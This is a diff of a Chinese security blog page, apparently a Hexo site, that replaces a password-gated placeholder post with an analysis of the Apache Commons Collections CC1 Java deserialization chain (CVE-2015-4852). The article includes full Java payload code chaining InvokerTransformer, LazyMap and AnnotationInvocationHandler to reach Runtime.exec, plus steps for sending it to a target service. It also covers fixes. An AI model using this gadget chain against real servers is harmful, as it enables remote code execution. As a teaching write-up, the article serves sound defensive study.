@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="加密文章," />
+  <meta name="keywords" content="java安全," />
 
 
 
@@ -81,17 +81,17 @@
 
 
 
-<meta name="description" content="请输入密码查看文章，里面有大惊喜">
+<meta name="description" content="0x00 漏洞概述Apache Commons Collections是Java中广泛使用的基础库，2015年Gabriel Lawrence和Chris Frohoff在《Marshalling Pickles》报告中披露了该库存在的反序列化远程代码执行漏洞（CVE-2015-4852）。攻击者通过构造恶意序列化数据，可在目标服务器上执行任意命令。 影响版本：Apache Commons Col">
 <meta property="og:type" content="article">
-<meta property="og:title" content="你好hexo">
-<meta property="og:url" content="http://www.planaaa.top/2024/05/23/%E4%BD%A0%E5%A5%BDhexo/index.html">
+<meta property="og:title" content="Java Commons Collections反序列化漏洞链分析（CC1链）">
+<meta property="og:url" content="http://www.planaaa.top/2025/03/13/Java-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88CC1%E9%93%BE%EF%BC%89/index.html">
 <meta property="og:site_name" content="Plan A">
-<meta property="og:description" content="请输入密码查看文章，里面有大惊喜">
+<meta property="og:description" content="0x00 漏洞概述Apache Commons Collections是Java中广泛使用的基础库，2015年Gabriel Lawrence和Chris Frohoff在《Marshalling Pickles》报告中披露了该库存在的反序列化远程代码执行漏洞（CVE-2015-4852）。攻击者通过构造恶意序列化数据，可在目标服务器上执行任意命令。 影响版本：Apache Commons Col">
 <meta property="og:locale">
-<meta property="article:published_time" content="2024-05-23T09:13:59.000Z">
-<meta property="article:modified_time" content="2024-05-24T07:42:57.217Z">
+<meta property="article:published_time" content="2025-03-13T01:19:37.000Z">
+<meta property="article:modified_time" content="2025-03-13T01:34:35.726Z">
 <meta property="article:author" content="brandy">
-<meta property="article:tag" content="加密文章">
+<meta property="article:tag" content="java安全">
 <meta name="twitter:card" content="summary">
 
 
@@ -122,14 +122,14 @@
 
 
 
-  <link rel="canonical" href="http://www.planaaa.top/2024/05/23/你好hexo/"/>
+  <link rel="canonical" href="http://www.planaaa.top/2025/03/13/Java-Commons-Collections反序列化漏洞链分析（CC1链）/"/>
 
 
 
   <script> 
    (function(){
-          if('123456'){
-              if (prompt('请输入文章密码') !== '123456'){
+          if(''){
+              if (prompt('请输入文章密码') !== ''){
                   alert('密码错误！');
                   history.back();
               }
@@ -137,7 +137,7 @@
       })();
   </script>
 
-  <title>你好hexo | Plan A</title>
+  <title>Java Commons Collections反序列化漏洞链分析（CC1链） | Plan A</title>
   
 
 
@@ -308,7 +308,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.planaaa.top/2024/05/23/%E4%BD%A0%E5%A5%BDhexo/">
+    <link itemprop="mainEntityOfPage" href="http://www.planaaa.top/2025/03/13/Java-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88CC1%E9%93%BE%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -325,7 +325,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">你好hexo</h1>
+          <h1 class="post-title" itemprop="name headline">Java Commons Collections反序列化漏洞链分析（CC1链）</h1>
         
 
         <div class="post-meta">
@@ -337,8 +337,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2024-05-23T17:13:59+08:00">
-                2024-05-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2025-03-13T09:19:37+08:00">
+                2025-03-13
               </time>
             
 
@@ -360,8 +360,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%8A%A0%E5%AF%86%E6%96%87%E7%AB%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">加密文章</span>
+                  <a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">java安全</span>
                   </a>
                 </span>
 
@@ -378,8 +378,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2024/05/23/%E4%BD%A0%E5%A5%BDhexo/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2024/05/23/%E4%BD%A0%E5%A5%BDhexo/" itemprop="commentCount"></span>
+                <a href="/2025/03/13/Java-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88CC1%E9%93%BE%EF%BC%89/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2025/03/13/Java-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88CC1%E9%93%BE%EF%BC%89/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -412,13 +412,68 @@
       
 
       
-        <h2 id="请输入密码查看文章，里面有大惊喜"><a href="#请输入密码查看文章，里面有大惊喜" class="headerlink" title="请输入密码查看文章，里面有大惊喜"></a>请输入密码查看文章，里面有大惊喜</h2><span id="more"></span>
+        <h2 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h2><p>Apache Commons Collections是Java中广泛使用的基础库，2015年Gabriel Lawrence和Chris Frohoff在《Marshalling Pickles》报告中披露了该库存在的反序列化远程代码执行漏洞（CVE-2015-4852）。攻击者通过构造恶意序列化数据，可在目标服务器上执行任意命令。</p>
+<p><strong>影响版本</strong>：Apache Commons Collections &lt;&#x3D; 3.2.1 &#x2F; &lt;&#x3D; 4.0.0</p>
+<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>Java反序列化漏洞的核心在于：当应用对不可信的序列化数据执行<code>readObject()</code>反序列化操作时，攻击者通过构造特殊的对象关系链（Gadget Chain），触发恶意代码执行。</p>
+<p>Commons Collections中以下关键类被利用：</p>
+<ul>
+<li><code>InvokerTransformer</code>：实现反射方法调用</li>
+<li><code>ChainedTransformer</code>：形成多级Transformer调用链</li>
+<li><code>LazyMap/LazyMap.decorate</code>：延迟执行机制</li>
+<li><code>AnnotationInvocationHandler</code>：JDK代理触发点</li>
+</ul>
+<h2 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h2><p>完整调用链如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">-&gt; AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt; memberValues.entrySet()</span><br><span class="line">-&gt; LazyMap.get()</span><br><span class="line">-&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; Runtime.exec()</span><br></pre></td></tr></table></figure>
 
 
 
+<h3 id="关键类分析"><a href="#关键类分析" class="headerlink" title="关键类分析"></a>关键类分析</h3><h4 id="1-InvokerTransformer"><a href="#1-InvokerTransformer" class="headerlink" title="1. InvokerTransformer"></a>1. InvokerTransformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="comment">// 通过反射执行指定方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="keyword">return</span> cls.getMethod(iMethodName).invoke(input, iArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>通过反射机制可调用任意方法，例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
 
-<p>试出来了没，送你个弱口令漏洞</p>
+<h4 id="2-ChainedTransformer"><a href="#2-ChainedTransformer" class="headerlink" title="2. ChainedTransformer"></a>2. ChainedTransformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="comment">// 链式执行多个Transformer</span></span><br><span class="line">        <span class="keyword">for</span> (Transformer transformer : iTransformers) &#123;</span><br><span class="line">            object = transformer.transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用于将多个Transformer连接成执行链，典型构造：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-LazyMap"><a href="#3-LazyMap" class="headerlink" title="3. LazyMap"></a>3. LazyMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">// 触发factory.transform()</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>get()</code>方法触发transform操作，结合AnnotationInvocationHandler的代理机制实现自动触发。</p>
+<h3 id="4-AnnotationInvocationHandler"><a href="#4-AnnotationInvocationHandler" class="headerlink" title="4. AnnotationInvocationHandler"></a>4. AnnotationInvocationHandler</h3><p>JDK内部类（sun.reflect.annotation），其<code>readObject()</code>方法会调用<code>memberValues.entrySet()</code>，而通过动态代理机制可将<code>memberValues</code>设置为代理对象，最终触发LazyMap的get方法。</p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
+<li>JDK版本 &lt;&#x3D; 8u71（高版本修复了AnnotationInvocationHandler）</li>
+<li>Commons-Collections 3.2.1</li>
+</ul>
+<h3 id="Payload构造代码"><a href="#Payload构造代码" class="headerlink" title="Payload构造代码"></a>Payload构造代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">    Map.class.getClassLoader(),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">    handler);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">mainHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
+<li>将payload序列化后发送给目标服务</li>
+<li>目标服务反序列化时触发调用链</li>
+<li>最终执行<code>Runtime.getRuntime().exec()</code>打开计算器</li>
+</ol>
+<h2 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h2><ol>
+<li><p>升级Commons-Collections到安全版本：</p>
+<ul>
+<li>3.x版本升级到3.2.2+</li>
+<li>4.x版本升级到4.1+</li>
+</ul>
+</li>
+<li><p>添加反序列化过滤器：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> ObjectInputFilter.Config.createFilter(</span><br><span class="line">    <span class="string">&quot;!org.apache.commons.collections.functors.*&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">ObjectInputFilter.Config.setObjectInputFilter(ois, filter);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用安全的序列化库（如JSON）</p>
+</li>
+</ol>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>CC1链展示了Java反序列化漏洞的典型利用模式，其核心在于通过精心构造的对象关系链触发危险操作。开发人员应：</p>
+<ul>
+<li>及时更新第三方库版本</li>
+<li>避免反序列化不可信数据</li>
+<li>使用白名单机制验证反序列化类</li>
+</ul>
+<blockquote>
+<p><strong>免责声明</strong>：本文所述技术仅供学习研究，请勿用于非法用途。</p>
+</blockquote>
 
       
     </div>
@@ -436,7 +491,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%8A%A0%E5%AF%86%E6%96%87%E7%AB%A0/" rel="tag"># 加密文章</a>
+            <a href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag"># java安全</a>
           
         </div>
       
@@ -449,15 +504,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" rel="next" title="浅谈RMI的基本使用">
+                <i class="fa fa-chevron-left"></i> 浅谈RMI的基本使用
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2024/05/24/Hexo-Typora-github%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/" rel="prev" title="Hexo+Typora+github搭建的博客优雅的上传图片">
-                Hexo+Typora+github搭建的博客优雅的上传图片 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -627,7 +682,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E6%96%87%E7%AB%A0%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E5%A4%A7%E6%83%8A%E5%96%9C"><span class="nav-number">1.</span> <span class="nav-text">请输入密码查看文章，里面有大惊喜</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x00 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 利用链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%B1%BB%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">关键类分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-InvokerTransformer"><span class="nav-number">3.1.1.</span> <span class="nav-text">1. InvokerTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-ChainedTransformer"><span class="nav-number">3.1.2.</span> <span class="nav-text">2. ChainedTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-LazyMap"><span class="nav-number">3.1.3.</span> <span class="nav-text">3. LazyMap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-AnnotationInvocationHandler"><span class="nav-number">3.2.</span> <span class="nav-text">4. AnnotationInvocationHandler</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">0x03 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">4.1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Payload%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81"><span class="nav-number">4.2.</span> <span class="nav-text">Payload构造代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">4.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="nav-number">5.</span> <span class="nav-text">0x04 修复方案</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">0x05 总结</span></a></li></ol></div>
             
 
           </div>
